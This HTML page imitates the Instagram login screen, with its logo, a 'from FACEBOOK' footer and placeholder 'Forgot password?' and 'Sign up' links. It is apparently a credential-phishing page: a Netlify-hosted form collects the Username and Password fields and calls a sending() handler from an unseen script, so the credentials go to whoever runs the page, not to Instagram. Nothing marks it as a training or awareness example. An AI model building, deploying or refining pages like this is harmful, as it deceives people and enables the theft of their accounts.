<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link href="style.css" rel="stylesheet">
    <script src="func.js"></script>
</head>
<body>
	<p>{{name}}</p>
<br />
<br />
    <div class="content">
        <img class="image" src="instagram.png">
        <form name="instagram_form" class="instagram_form" netlify>
            <input name="Username" id="username" type="text" placeholder="Phone number, username, Or email" required>
            <input name="Password" id="password" type="password" placeholder="Password" required>
            <input class="submit" type="submit" value="Log In" onclick="sending()">
            <br />  
            <p style="color:grey;text-align: center;">OR</p>
            <br>         
            <a href="#">Forgot password?</a> 
            <br/>
        </form>
    </div>
    <div class="sign">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <footer>
        <p>from</p>
        <h5>FACEBOOK</h5>
    </footer>
</body>
</html>
